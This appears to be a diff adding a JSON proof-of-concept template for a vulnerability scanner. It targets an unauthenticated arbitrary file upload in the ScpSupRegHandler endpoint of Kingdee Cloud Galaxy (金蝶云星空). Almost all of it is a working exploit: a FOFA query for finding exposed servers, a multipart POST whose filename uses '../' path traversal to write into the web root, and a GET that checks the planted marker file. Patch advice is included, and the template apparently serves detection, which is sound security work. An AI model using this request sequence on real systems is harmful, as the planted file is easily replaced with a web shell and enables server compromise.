@@ -1,0 +1,70 @@
+{
+  "product": "金蝶云星空",
+  "vul_name": "金蝶云星空管理中心 任意文件上传(ScpSupRegHandler)",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "金蝶云星空管理中心ScpSupRegHandler接口存在任意文件上传漏洞。攻击者可在无需登录的情况下利用此漏洞上传任意文件",
+  "version": "金蝶云星空企业版私有云、企业版私有云（订阅）、标准版私有云（订阅）、版本<=V8.1",
+  "note": "",
+  "search": {
+    "FOFA": "icon_hash=\"-1629133697\" && title==\"金蝶云星空\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_43981050/article/details/134523305",
+  "fix": [
+    "目前官方已修复该漏洞，受影响用户可以升级更新到安全版本。",
+    "官方下载链接：https://vip.kingdee.com/article/505394681531036160?productLineId=1&amp%3BisKnowledge=2&isKnowledge=2"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/k3cloud/SRM/ScpSupRegHandler",
+        "file": {
+          "dbId_v": [
+            null,
+            "."
+          ],
+          "FID": [
+            null,
+            "2022"
+          ],
+          "FAtt": [
+            "../../../../uploadfiles/52e039302a62d077.txt",
+            "95cc64dd2825f9df13ec4ad683ecf339",
+            "text/plain"
+          ]
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "IsSuccess"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/k3cloud/uploadfiles/52e039302a62d077.txt"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
